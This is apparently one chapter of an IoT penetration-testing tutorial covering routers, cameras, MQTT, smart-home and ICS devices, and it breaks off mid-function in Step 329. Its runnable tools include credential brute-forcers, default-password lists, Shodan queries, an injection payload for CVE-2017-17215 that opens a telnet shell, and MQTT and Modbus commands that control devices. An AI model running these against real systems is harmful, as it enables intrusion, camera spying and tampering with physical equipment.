# Part 33: IoT Security Testing (Steps 321-330)

## Step 321: IoT Security Fundamentals

```python
#!/usr/bin/env python3
# iot_security_fundamentals.py

IOT_ATTACK_SURFACE = """
=== IoT Attack Surface ===

1. HARDWARE
   - UART/Serial console (often unsecured)
   - JTAG debugging interface
   - SPI/I2C for flash memory
   - Physical access to PCB
   - Chip desoldering for firmware extraction

2. FIRMWARE
   - Default credentials embedded
   - Hardcoded passwords/keys
   - Debug functions not removed
   - Old/vulnerable libraries
   - Unencrypted firmware updates

3. COMMUNICATION
   - Unencrypted protocols (HTTP, MQTT, COAP)
   - Weak encryption
   - Missing certificate validation
   - SSID/password in plaintext
   - Zigbee, Z-Wave, LoRa vulnerabilities

4. CLOUD BACKEND
   - API vulnerabilities
   - IDOR in device management
   - Weak authentication
   - Insecure direct cloud access

5. MOBILE APP
   - Insecure data storage
   - API keys in app
   - Traffic interception
   - Reverse engineering

6. WEB INTERFACE
   - Default admin credentials
   - Command injection
   - CSRF, XSS vulnerabilities
   - Outdated web frameworks
"""

IOT_TOP_10 = """
=== OWASP IoT Top 10 ===

I1:  Weak, Guessable, or Hardcoded Passwords
I2:  Insecure Network Services
I3:  Insecure Ecosystem Interfaces (web/cloud/mobile)
I4:  Lack of Secure Update Mechanism
I5:  Use of Insecure or Outdated Components
I6:  Insufficient Privacy Protection
I7:  Insecure Data Transfer and Storage
I8:  Lack of Device Management
I9:  Insecure Default Settings
I10: Lack of Physical Hardening
"""

print(IOT_ATTACK_SURFACE)
print(IOT_TOP_10)

# IoT Testing Methodology
IOT_METHODOLOGY = """
=== IoT Penetration Testing Methodology ===

1. RECONNAISSANCE
   - Device identification (Shodan, Censys)
   - Firmware version discovery
   - Protocol identification

2. NETWORK ANALYSIS
   - Network scan
   - Protocol analysis (Wireshark)
   - MQTT/CoAP testing

3. WEB INTERFACE TESTING
   - Default credentials
   - Web vulnerabilities
   - API analysis

4. FIRMWARE ANALYSIS
   - Download firmware (if possible)
   - Extract with binwalk
   - Static analysis

5. RUNTIME ANALYSIS
   - Dynamic analysis
   - Traffic interception
   - Fuzzing

6. HARDWARE ANALYSIS (if applicable)
   - UART/JTAG access
   - Flash memory dump
"""
print(IOT_METHODOLOGY)
```

## Step 322: IoT Device Discovery

```python
#!/usr/bin/env python3
# iot_discovery.py

import socket
import subprocess
from typing import List, Dict

class IoTDiscovery:
    def __init__(self):
        self.iot_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet',
            80: 'HTTP', 443: 'HTTPS',
            554: 'RTSP (Camera)', 1883: 'MQTT',
            5000: 'HTTP-Alt', 5683: 'CoAP',
            6668: 'IRC/ZigBee', 7547: 'CWMP/TR-069',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
            8883: 'MQTT-TLS', 9000: 'HTTP-Alt',
            49152: 'UPnP'
        }
        self.iot_fingerprints = [
            'Hikvision', 'Dahua', 'AXIS', 'Bosch',
            'Ubiquiti', 'MikroTik', 'TP-Link', 'D-Link',
            'Netgear', 'ASUS', 'Philips', 'Nest'
        ]
    
    def scan_iot_devices(self, subnet: str) -> str:
        """Scan for IoT devices using nmap"""
        ports = ','.join(str(p) for p in self.iot_ports.keys())
        cmd = [
            'nmap', '-sV', '-p', ports,
            '--script', 'banner,http-title,rtsp-url-brute',
            '-T4', '--open', subnet
        ]
        print(f"[*] Scanning: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def discover_upnp(self):
        """Discover UPnP devices on network"""
        ssdp_request = (
            'M-SEARCH * HTTP/1.1\r\n'
            'HOST: 239.255.255.250:1900\r\n'
            'MAN: "ssdp:discover"\r\n'
            'MX: 3\r\n'
            'ST: ssdp:all\r\n'
            '\r\n'
        ).encode()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(5)
        sock.sendto(ssdp_request, ('239.255.255.250', 1900))
        
        devices = []
        try:
            while True:
                data, addr = sock.recvfrom(4096)
                response = data.decode(errors='ignore')
                if 'ST:' in response or 'USN:' in response:
                    devices.append({'ip': addr[0], 'response': response[:200]})
                    print(f"[+] UPnP: {addr[0]}")
        except socket.timeout:
            pass
        
        sock.close()
        return devices
    
    def discover_mqtt(self, broker_ip: str, port: int = 1883):
        """ทดสอบ MQTT broker แบบ anonymous"""
        import paho.mqtt.client as mqtt
        
        topics_found = []
        client = mqtt.Client()
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                print(f"[+] MQTT broker accessible without auth!")
                client.subscribe('#')  # Subscribe to all topics
            elif rc == 5:
                print(f"[-] MQTT requires authentication")
        
        def on_message(client, userdata, msg):
            topics_found.append({'topic': msg.topic, 'payload': str(msg.payload[:50])})
            print(f"[+] MQTT topic: {msg.topic} = {msg.payload[:30]}")
        
        client.on_connect = on_connect
        client.on_message = on_message
        
        try:
            client.connect(broker_ip, port, 60)
            client.loop_start()
            import time; time.sleep(10)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[-] MQTT error: {e}")
        
        return topics_found
    
    def shodan_search_iot(self, api_key: str, query: str) -> List[Dict]:
        """Search Shodan for IoT devices"""
        try:
            import shodan
            api = shodan.Shodan(api_key)
            results = api.search(query)
            devices = []
            for match in results['matches']:
                devices.append({
                    'ip': match['ip_str'],
                    'port': match['port'],
                    'org': match.get('org', 'N/A'),
                    'country': match.get('location', {}).get('country_name', 'N/A'),
                    'banner': match.get('data', '')[:100]
                })
            return devices
        except Exception as e:
            print(f"[-] Shodan error: {e}")
            return []

# ตัวอย่าง Shodan queries
SHODAN_IOT_QUERIES = [
    'product:"Hikvision" port:8080',
    'port:23 product:"BusyBox"',
    'port:1883 MQTT',
    'Dahua IPC/DVR/NVR',
    'port:554 rtsp',
    '"default password" router',
    'http.title:"IP Camera"',
]

print("=== IoT Discovery Tools ===")
print("\nShodan queries for IoT:")
for q in SHODAN_IOT_QUERIES:
    print(f"  shodan search '{q}'")
print("\nCensys:")
print("  censys search 'services.port: 1883'")
print("  censys search 'services.service_name: mqtt'")

discovery = IoTDiscovery()
print("\nNmap IoT scan command:")
print("  nmap -sV -p 23,80,443,554,1883,5683,8080 --script banner 192.168.1.0/24")
```

## Step 323: Firmware Analysis

```bash
#!/bin/bash
# firmware_analysis.sh

FIRMWARE="/tmp/device_firmware.bin"

# ============================================
# Firmware Download Methods
# ============================================

# Method 1: From manufacturer website
# wget https://www.vendor.com/firmware/latest.bin

# Method 2: From device (if admin access)
# Usually at /firmware.bin or through API
curl -u admin:admin http://192.168.1.1/backup.bin -o firmware.bin

# Method 3: Intercept update process
# Setup Burp as proxy, trigger OTA update

# Method 4: TFTP server
# Some devices use TFTP for updates
tftp 192.168.1.1 -c get firmware.bin

# ============================================
# Binwalk Analysis
# ============================================
echo "[*] Analyzing firmware with binwalk"

# Basic scan
binwalk $FIRMWARE

# Extract everything
binwalk -e $FIRMWARE
# Output: _device_firmware.bin.extracted/

# Extract with verbose
binwalk -Me $FIRMWARE  # -M = recursive, -e = extract

# Show entropy (detect encryption/compression)
binwalk -E $FIRMWARE

# Scan for specific signatures
binwalk -t -y 'squashfs' $FIRMWARE  # SquashFS filesystem
binwalk -t -y 'uImage' $FIRMWARE    # uBoot image
binwalk -t -y 'gzip' $FIRMWARE      # GZIP compressed

# ============================================
# Filesystem Exploration
# ============================================
EXTRACTED="_device_firmware.bin.extracted/squashfs-root"

if [ -d "$EXTRACTED" ]; then
    echo "[*] Exploring extracted filesystem"
    
    # List directory structure
    ls -la $EXTRACTED
    
    # Find credential files
    grep -r 'password\|passwd\|admin\|root' $EXTRACTED/etc/ 2>/dev/null
    cat $EXTRACTED/etc/shadow 2>/dev/null
    cat $EXTRACTED/etc/passwd 2>/dev/null
    
    # Find hardcoded secrets
    grep -r 'admin\|password\|secret\|token\|key' \
        $EXTRACTED/etc/ \
        $EXTRACTED/usr/share/ \
        2>/dev/null | grep -v Binary
    
    # Find web server config
    find $EXTRACTED -name 'httpd.conf' -o -name 'nginx.conf' 2>/dev/null
    
    # Find init scripts
    ls $EXTRACTED/etc/init.d/ 2>/dev/null
    cat $EXTRACTED/etc/rc.local 2>/dev/null
    
    # Find web root
    find $EXTRACTED -type d -name 'www' -o -name 'web' -o -name 'html' 2>/dev/null
    
    # Find private keys
    find $EXTRACTED -name '*.key' -o -name '*.pem' -o -name '*.crt' 2>/dev/null
    
    # Find SSL certificates (for MitM)
    find $EXTRACTED -name 'ca.crt' 2>/dev/null
fi

# ============================================
# Binary Analysis
# ============================================
echo "[*] Analyzing binaries"

# Find all executables
find $EXTRACTED -type f -executable 2>/dev/null | head -20

# Analyze specific binary
BINARY="$EXTRACTED/usr/bin/httpd"
[ -f "$BINARY" ] && {
    file $BINARY
    strings $BINARY | grep -i 'password\|admin\|secret\|debug\|192.168'
    readelf -d $BINARY 2>/dev/null  # Check dependencies
    checksec --file=$BINARY 2>/dev/null  # Check protections
}

# ============================================
# Emulation with QEMU
# ============================================
echo "[*] Emulate firmware with QEMU"

# ARM firmware emulation
# apt install qemu-user qemu-user-static binutils-arm-linux-gnueabihf

# Copy QEMU binary into filesystem
cp /usr/bin/qemu-arm-static $EXTRACTED/usr/bin/

# Chroot into firmware
chroot $EXTRACTED /bin/sh

# Or use FirmAE for automated emulation
# https://github.com/pr0v3rbs/FirmAE
echo "./run.sh -r TP-Link firmware.bin"

echo "[+] Firmware analysis complete"
```

## Step 324: MQTT Security Testing

```python
#!/usr/bin/env python3
# mqtt_security_tester.py

import paho.mqtt.client as mqtt
import json
import time
from typing import List, Dict

class MQTTSecurityTester:
    def __init__(self, broker: str, port: int = 1883):
        self.broker = broker
        self.port = port
        self.messages = []
        self.client = mqtt.Client()
    
    def test_anonymous_access(self) -> bool:
        """ทดสอบว่า broker อนุญาต anonymous หรือไม่"""
        connected = [False]
        
        def on_connect(client, userdata, flags, rc):
            connected[0] = (rc == 0)
        
        test_client = mqtt.Client()
        test_client.on_connect = on_connect
        try:
            test_client.connect(self.broker, self.port, 5)
            test_client.loop_start()
            time.sleep(2)
            test_client.loop_stop()
            test_client.disconnect()
        except:
            pass
        
        if connected[0]:
            print(f"[+] CRITICAL: Anonymous access allowed!")
        else:
            print(f"[-] Anonymous access denied")
        
        return connected[0]
    
    def subscribe_all_topics(self, timeout: int = 30):
        """สมัคร subscribe topics ทั้งหมด"""
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                client.subscribe('#')  # Subscribe to everything
                client.subscribe('$SYS/#')  # Broker system info
                print(f"[+] Subscribed to all topics")
        
        def on_message(client, userdata, msg):
            message = {
                'topic': msg.topic,
                'payload': msg.payload.decode(errors='ignore')[:100],
                'qos': msg.qos,
                'retain': msg.retain
            }
            self.messages.append(message)
            print(f"[+] Topic: {msg.topic} | {str(msg.payload[:50])}")
        
        self.client.on_connect = on_connect
        self.client.on_message = on_message
        
        try:
            self.client.connect(self.broker, self.port, 60)
            self.client.loop_start()
            print(f"[*] Listening for {timeout}s...")
            time.sleep(timeout)
            self.client.loop_stop()
            self.client.disconnect()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return self.messages
    
    def test_publish_control_topics(self, control_topics: List[str]):
        """ทดสอบการ publish ไปยัง control topics"""
        results = []
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                for topic in control_topics:
                    # ทดสอบส่ง command
                    test_payloads = [
                        b'{"command": "reboot"}',
                        b'{"power": "on"}',
                        b'{"lock": true}',
                        b'0',
                        b'1',
                        b'ON',
                        b'OFF'
                    ]
                    for payload in test_payloads:
                        result = client.publish(topic, payload, qos=1)
                        results.append({
                            'topic': topic,
                            'payload': payload.decode(),
                            'success': result.rc == 0
                        })
                        print(f"[*] Published to {topic}: {payload[:20]}")
        
        pub_client = mqtt.Client()
        pub_client.on_connect = on_connect
        try:
            pub_client.connect(self.broker, self.port, 5)
            pub_client.loop_start()
            time.sleep(5)
            pub_client.loop_stop()
            pub_client.disconnect()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return results
    
    def brute_force_credentials(self, users: List[str], passwords: List[str]) -> List[Dict]:
        """Brute force MQTT credentials"""
        valid = []
        for username in users:
            for password in passwords:
                client = mqtt.Client()
                client.username_pw_set(username, password)
                connected = [False]
                
                def on_conn(c, ud, f, rc):
                    connected[0] = (rc == 0)
                
                client.on_connect = on_conn
                try:
                    client.connect(self.broker, self.port, 3)
                    client.loop_start()
                    time.sleep(1)
                    client.loop_stop()
                    if connected[0]:
                        print(f"[+] VALID: {username}:{password}")
                        valid.append({'user': username, 'pass': password})
                    client.disconnect()
                except:
                    pass
        return valid
    
    def test_sys_topics(self):
        """ดูข้อมูล broker ผ่าน $SYS topics"""
        sys_data = {}
        
        def on_msg(client, ud, msg):
            sys_data[msg.topic] = msg.payload.decode(errors='ignore')
            print(f"  {msg.topic}: {msg.payload.decode()[:50]}")
        
        client = mqtt.Client()
        client.on_message = on_msg
        client.on_connect = lambda c, ud, f, rc: c.subscribe('$SYS/#')
        
        print("[*] Reading $SYS topics (broker info leak):")
        try:
            client.connect(self.broker, self.port, 5)
            client.loop_start()
            time.sleep(5)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return sys_data

# Demo usage
print("=== MQTT Security Testing ===")
print("\nmosquitto_sub/pub examples:")
print("  mosquitto_sub -h 192.168.1.1 -t '#' -v  # Subscribe all")
print("  mosquitto_pub -h 192.168.1.1 -t 'home/light' -m 'ON'")
print("  mosquitto_sub -h 192.168.1.1 -t '$SYS/#' -v  # Broker info")
print("  mosquitto_sub -u admin -P admin -h 192.168.1.1 -t '#'")
```

## Step 325: Router & Switch Testing

```bash
#!/bin/bash
# router_security_testing.sh

TARGET_ROUTER="192.168.1.1"

echo "=== Router Security Testing ==="

# ============================================
# Default Credentials Testing
# ============================================
echo "[*] Testing default credentials"

# Common default combos
for CREDS in "admin:admin" "admin:" ":admin" "admin:1234" "admin:password" \
             "admin:admin123" "root:root" "root:toor" "user:user"; do
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    # HTTP Basic Auth
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -u "$USER:$PASS" http://$TARGET_ROUTER/ --max-time 3)
    
    if [ "$CODE" = "200" ]; then
        echo "[+] VALID: $USER:$PASS (HTTP Basic)"
    fi
    
    # Form-based login
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -d "username=$USER&password=$PASS&submit=Login" \
        http://$TARGET_ROUTER/login.cgi --max-time 3)
 done

# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    $TARGET_ROUTER http-get / -t 4 -w 10

# ============================================
# Service Enumeration
# ============================================
echo "[*] Service enumeration"
nmap -sV -p 21,22,23,80,443,8080,8443,7547 $TARGET_ROUTER

# ============================================
# Vulnerability Scanning
# ============================================
echo "[*] Vulnerability scanning"

# Nikto web scan
nikto -host http://$TARGET_ROUTER/ -maxtime 60

# RouterSploit
echo "Use RouterSploit:"
echo "  rsf> use scanners/autopwn"
echo "  rsf> set target $TARGET_ROUTER"
echo "  rsf> run"

# ============================================
# Known CVEs
# ============================================
echo "[*] Common router vulnerabilities"

# CVE-2017-17215 - Huawei HG532 RCE
curl -X POST http://$TARGET_ROUTER:37215/ctrlt/DeviceUpgrade_1 \
    -d '<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$( /bin/busybox telnetd -l /bin/sh)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>' 2>/dev/null

# Check for TR-069 (ISP remote management)
echo "[*] Check TR-069 (port 7547)"
nmap -p 7547 --script http-title $TARGET_ROUTER

# ============================================
# SNMP Testing
# ============================================
echo "[*] SNMP testing"

# Community string brute force
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt \
    $TARGET_ROUTER

# SNMP walk with common community strings
for COMM in public private community cisco manager admin; do
    snmpwalk -v 2c -c $COMM $TARGET_ROUTER 2>/dev/null | head -5 && \
        echo "[+] SNMP community '$COMM' works!"
done

# Full SNMP walk
snmpwalk -v 2c -c public $TARGET_ROUTER > /tmp/snmp_output.txt

# Interesting OIDs
snmpget -v 2c -c public $TARGET_ROUTER sysDescr.0  # System description
snmpget -v 2c -c public $TARGET_ROUTER 1.3.6.1.4.1.9.2.1.2.0  # Cisco config

echo "[+] Router testing complete"
```

## Step 326: IP Camera Security Testing

```python
#!/usr/bin/env python3
# ipcamera_security.py

import requests
import subprocess
from typing import List, Dict

class IPCameraSecurityTester:
    def __init__(self):
        self.default_creds = [
            ('admin', 'admin'), ('admin', ''), ('admin', '12345'),
            ('admin', '123456'), ('admin', 'password'), ('root', 'root'),
            ('root', ''), ('admin', 'admin123'), ('admin', '888888'),
            ('admin', '666666'), ('admin', 'camera'), ('ubnt', 'ubnt'),
        ]
        self.common_paths = [
            '/', '/index.html', '/index.asp', '/main.html',
            '/login', '/login.html', '/cgi-bin/viewer/video.jpg',
            '/videostream.cgi', '/snapshot.cgi', '/image/jpeg.cgi',
            '/mjpeg', '/video.cgi', '/live/0/mjpeg.jpg'
        ]
    
    def test_default_credentials(self, ip: str, port: int = 80) -> List[Dict]:
        """Test default credentials on camera"""
        valid = []
        base_url = f"http://{ip}:{port}"
        
        for user, password in self.default_creds:
            try:
                # Test HTTP Basic Auth
                r = requests.get(base_url, auth=(user, password), timeout=5)
                if r.status_code == 200 and r.status_code != 401:
                    valid.append({'user': user, 'pass': password, 'method': 'basic'})
                    print(f"[+] VALID (Basic): {user}:{password}")
                
                # Test form-based login
                login_data = {
                    'username': user, 'password': password,
                    'user': user, 'pass': password,
                    'cmd': 'login'
                }
                r2 = requests.post(f"{base_url}/cgi-bin/viewer/login",
                                   data=login_data, timeout=5)
                if 'success' in r2.text.lower() or r2.status_code == 200:
                    valid.append({'user': user, 'pass': password, 'method': 'form'})
            except:
                pass
        
        return valid
    
    def check_rtsp_stream(self, ip: str) -> List[str]:
        """Try common RTSP stream URLs"""
        rtsp_urls = [
            f"rtsp://{ip}:554/live/ch00_0",
            f"rtsp://{ip}:554/h264/ch1/main/av_stream",
            f"rtsp://{ip}:554/live.sdp",
            f"rtsp://{ip}:554/live",
            f"rtsp://admin:admin@{ip}:554/live",
            f"rtsp://admin:12345@{ip}:554/live",
            f"rtsp://admin:@{ip}:554/live",
            f"rtsp://{ip}:554/onvif/device_service",
        ]
        
        accessible = []
        for url in rtsp_urls:
            result = subprocess.run(
                ['ffprobe', '-v', 'quiet', '-print_format', 'json',
                 '-show_streams', url],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                accessible.append(url)
                print(f"[+] RTSP accessible: {url}")
        
        return accessible
    
    def capture_snapshot(self, ip: str, user: str = 'admin', password: str = 'admin') -> bool:
        """Capture snapshot from camera"""
        snapshot_urls = [
            f"http://{ip}/snapshot.cgi",
            f"http://{ip}/cgi-bin/snapshot.cgi",
            f"http://{ip}/image/jpeg.cgi",
            f"http://{ip}/snapshot",
            f"http://{ip}/cgi-bin/view/index.cgi?rate=0&resolution=640x480",
        ]
        
        for url in snapshot_urls:
            try:
                r = requests.get(url, auth=(user, password), timeout=10, stream=True)
                if r.status_code == 200 and 'image' in r.headers.get('content-type', ''):
                    with open(f"/tmp/camera_{ip}_snapshot.jpg", 'wb') as f:
                        f.write(r.content)
                    print(f"[+] Snapshot saved from {url}")
                    return True
            except:
                pass
        return False
    
    def check_onvif(self, ip: str, port: int = 80):
        """Test ONVIF protocol (standard for IP cameras)"""
        # ONVIF Device Discovery
        onvif_probe = """<?xml version="1.0" encoding="utf-8"?>
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>
  </Body>
</Envelope>"""
        
        try:
            r = requests.post(
                f"http://{ip}:{port}/onvif/device_service",
                data=onvif_probe,
                headers={'Content-Type': 'application/soap+xml'},
                timeout=5
            )
            if r.status_code == 200:
                print(f"[+] ONVIF accessible on {ip}:{port}")
                return r.text
        except Exception as e:
            pass
        return None
    
    def shodan_camera_search(self) -> list:
        """Shodan searches for exposed cameras"""
        return [
            'port:554 has_screenshot:true',
            'product:"Hikvision" country:TH',
            'http.title:"IP Camera" port:80',
            'port:8080 has_screenshot:true',
            'Netcam http.title',
        ]

# Demo
tester = IPCameraSecurityTester()
print("=== IP Camera Security Testing ===")
print("\nRTSP URL formats:")
for url in tester.check_rtsp_stream.__doc__.split('\n'):
    print(f"  {url}")
print("\nCapture RTSP stream:")
print("  ffmpeg -i rtsp://admin:admin@192.168.1.100:554/live -t 10 output.mp4")
print("  vlc rtsp://admin:admin@192.168.1.100:554/live")
```

## Step 327: Industrial IoT (ICS/SCADA) Basics

```python
#!/usr/bin/env python3
# ics_scada_basics.py

ICS_OVERVIEW = """
=== Industrial Control Systems (ICS/SCADA) Overview ===

Components:
  - HMI (Human-Machine Interface) - Operator console
  - PLC (Programmable Logic Controller) - Field devices
  - RTU (Remote Terminal Unit) - Remote monitoring
  - Historian - Data storage
  - Engineering Workstation - PLC programming

Common Protocols:
  - Modbus (TCP port 502) - Common PLC protocol
  - DNP3 (port 20000) - Power/water utilities  
  - PROFINET (varies) - Industrial Ethernet
  - EtherNet/IP (port 44818) - Industrial protocol
  - BACnet (port 47808) - Building automation
  - OPC UA (port 4840) - Modern OPC
  - ICCP - Inter-control center protocol
  - IEC 104 (port 2404) - Energy sector

ICS Security Tools:
  - Shodan Industrial: industrial.shodan.io
  - s7scan - Siemens S7 scanner
  - plcscan - PLC discovery
  - modbuspal - Modbus simulator/testing
  - CrystalBall - ICS fuzzer
  - SCADA StrangeLove tools
"""

MODBUS_TESTING = """
=== Modbus Security Testing ===
# Modbus TCP - No authentication by default!
# Port 502

# Read coil status (bits)
modbuscli -m tcp -a 1 -t 0x01 192.168.1.100  # Read coils 1-10

# Read holding registers
modbuscli -m tcp -a 1 -t 0x03 -r 0 -c 10 192.168.1.100

# Write single coil (turn on/off)
modbuscli -m tcp -a 1 -t 0x05 -r 0 -v 0xFF00 192.168.1.100  # ON
modbuscli -m tcp -a 1 -t 0x05 -r 0 -v 0x0000 192.168.1.100  # OFF

# Write register
modbuscli -m tcp -a 1 -t 0x06 -r 100 -v 500 192.168.1.100

# Python modbus (pymodbus)
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.1.100')
client.connect()
result = client.read_holding_registers(0, 10, unit=1)
print(result.registers)
client.write_register(100, 9999, unit=1)  # Change setpoint!
client.close()
"""

SIEMENS_S7 = """
=== Siemens S7 PLC Testing ===
# Port 102 (S7comm), Port 443 (HTTPS for Web Server)

# S7comm tools
pip install python-snap7

import snap7
from snap7.util import *

client = snap7.client.Client()
client.connect('192.168.1.100', 0, 1)  # IP, Rack 0, Slot 1

# Read CPU info  
cpu_info = client.get_cpu_info()
print(cpu_info)

# Read data block
db = client.db_read(1, 0, 10)  # DB1, offset 0, size 10
print(db.hex())

# Stop/Start PLC (DANGEROUS!)
# client.plc_stop()
# client.plc_cold_start()

client.disconnect()
"""

print(ICS_OVERVIEW)
print(MODBUS_TESTING)
print(SIEMENS_S7)

print("""
=== Important ICS Testing Note ===
! NEVER test ICS/SCADA without explicit permission
! These systems control critical infrastructure
! Even read operations can cause disruption
! Always test on isolated test environments
! Coordinate with operations team
! Have emergency stop procedures ready
""")
```

## Step 328: Smart Home Device Testing

```python
#!/usr/bin/env python3
# smart_home_testing.py

import requests
import json
from typing import Dict, List

class SmartHomeSecurityTester:
    def __init__(self):
        self.smart_home_ports = {
            1400: 'Sonos', 1901: 'UPnP',
            8008: 'Chromecast', 8009: 'Chromecast',
            8060: 'Roku', 8080: 'HTTP',
            8123: 'Home Assistant', 9080: 'WeMo',
            49152: 'UPnP', 55442: 'SmartThings'
        }
    
    def test_home_assistant(self, ip: str, port: int = 8123):
        """ทดสอบ Home Assistant security"""
        base_url = f"http://{ip}:{port}"
        findings = []
        
        # Check if auth required
        r = requests.get(f"{base_url}/api/", timeout=5)
        if r.status_code == 200 and 'message' in r.text:
            findings.append({
                'issue': 'Home Assistant API accessible without authentication',
                'severity': 'CRITICAL',
                'url': f"{base_url}/api/"
            })
            
            # Enumerate all entities
            entities = requests.get(f"{base_url}/api/states").json()
            print(f"[+] Found {len(entities)} entities")
            
            # Unlock door, turn off alarm, etc.
            for entity in entities[:5]:
                print(f"  Entity: {entity['entity_id']} = {entity['state']}")
        
        # Check for password in config
        r2 = requests.get(f"{base_url}/api/config", timeout=5)
        if r2.status_code == 200:
            print(f"[+] Config exposed: {r2.text[:200]}")
        
        return findings
    
    def test_philips_hue(self, bridge_ip: str) -> Dict:
        """Test Philips Hue bridge security"""
        base_url = f"http://{bridge_ip}/api"
        findings = {}
        
        # Get device info without auth
        r = requests.get(f"http://{bridge_ip}/description.xml")
        if r.status_code == 200:
            findings['unauthenticated_info'] = 'Device info accessible'
            print(f"[+] Hue bridge info accessible")
        
        # Try to create new user (button press required, but test if rate-limited)
        payload = {"devicetype": "security_test#pentest"}
        r2 = requests.post(base_url, json=payload)
        if r2.status_code == 200:
            result = r2.json()
            if 'success' in str(result):
                # Got API key without button press (misconfigured)
                api_key = result[0]['success']['username']
                findings['auth_bypass'] = f"API key obtained: {api_key}"
                print(f"[+] Got API key: {api_key}")
                
                # Now control lights
                lights = requests.get(f"{base_url}/{api_key}/lights").json()
                findings['lights'] = list(lights.keys())
        
        return findings
    
    def test_chromecast(self, ip: str, port: int = 8008) -> Dict:
        """Test Chromecast device"""
        base_url = f"http://{ip}:{port}"
        findings = {}
        
        # Get device info
        r = requests.get(f"{base_url}/setup/eureka_info", timeout=5)
        if r.status_code == 200:
            info = r.json()
            findings['device_info'] = {
                'name': info.get('name'),
                'mac': info.get('mac_address'),
                'build': info.get('build_info', {}).get('build_version')
            }
            print(f"[+] Chromecast info: {findings['device_info']}")
        
        # Network scan for nearby devices
        r2 = requests.get(f"{base_url}/setup/scan_results", timeout=5)
        if r2.status_code == 200:
            wifi_networks = r2.json()
            findings['wifi_scan'] = [n.get('ssid') for n in wifi_networks]
            print(f"[+] Nearby WiFi: {findings['wifi_scan'][:5]}")
        
        return findings
    
    def discover_smart_devices(self, subnet: str) -> str:
        """Scan for smart home devices"""
        import subprocess
        ports = ','.join(str(p) for p in self.smart_home_ports.keys())
        cmd = f"nmap -sV -p {ports} --open {subnet}"
        print(f"[*] {cmd}")
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return result.stdout

# Demo
tester = SmartHomeSecurityTester()
print("=== Smart Home Security Testing ===")
print("\nCommon smart home vulnerabilities:")
print("  - Default/no authentication")
print("  - Unencrypted local communication")
print("  - API accessible without auth")
print("  - Cloud storage of sensitive data")
print("  - Weak pairing mechanisms")
print("  - UPnP exposing internal services")
print("\nTools:")
print("  - nmap for port scanning")
print("  - wireshark for traffic analysis")
print("  - binwalk for firmware analysis")
print("  - curl for API testing")
```

## Step 329: IoT Fuzzing

```python
#!/usr/bin/env python3
# iot_fuzzing.py

import socket
import random
import time
from typing import List

class IoTFuzzer:
    """IoT protocol fuzzer for authorized testing"""
    
    def generate_random_bytes(self, min_len: int = 1, max_len: int = 1024) -> bytes:
        """สร้าง random bytes payload"""
        length = random.randint(min_len, max_len)
        return bytes([random.randint(0, 255) for _ in range(length)])
    
    def fuzz_tcp_service(self, ip: str, port: int, num_cases: int = 100):
        """ฟาบ TCP service"""
        print(f"[*] Fuzzing {ip}:{port} with {num_cases} cases")
        crashes = []
        
        for i in range(num_cases):
            payload = self.generate_random_bytes(1, 2048)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                banner = s.recv(1024)
                s.send(payload)
                response = s.recv(4096)
                s.close()
            except ConnectionRefusedError:
                crashes.append({'case': i, 'payload': payload[:20].hex(), 'error': 'connection refused'})
                print(f"[!] Case {i}: Connection refused (possible crash)")
                time.sleep(2)  # Wait for service restart
            except socket.timeout:
                pass  # Normal timeout
            except Exception as e:
                print(f"[!] Case {i}: {e}")
        
        return crashes
    
    def fuzz_http_parameters(self, base_url: str, parameters: List[str]):
        """ฟาบ HTTP พารามิเตอร์"""
        import requests
        
        fuzz_payloads = [
            "A" * 100, "A" * 1000, "A" * 10000,  # Length overflow
            "../../../etc/passwd",  # Path traversal
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert(1)</script>",  # XSS
            "%n%n%n",  # Format string
            "\x00" * 100,  # Null bytes
            "\xff\xfe" * 50,  # Unicode
            "{{7*7}}",  # SSTI
        ]
        
        findings = []
        for param in parameters:
            for payload in fuzz_payloads:
                try:
                    r = requests.get(
                        base_url,
                        params={param: payload},
                        timeout=5
                    )
                    if r.status_code == 500:
                        findings.append({
                            'param': param,
                            'payload': payload[:30],
                            'status': r.status_code
                        })
                        print(f"[+] Error response for {param}={payload[:20]}")
                except:
                    pass
        
        return findings
    
    def fuzz_modbus(self, ip: str, port: int = 502):
        """ฟาบ Modbus TCP"""
        import struct
        
        print(f"[*] Fuzzing Modbus on {ip}:{port}")
        
        # Modbus TCP header format: Transaction ID + Protocol ID + Length + Unit ID
        for func_code in range(1, 130):  # All function codes
            for data_len in [0, 4, 8, 128, 256]:
                payload = struct.pack('>HHHB', 
                    random.randint(0, 65535),  # Transaction ID
                    0,  # Protocol ID
                    1 + data_len,  # Length
                    1  # Unit ID
                )
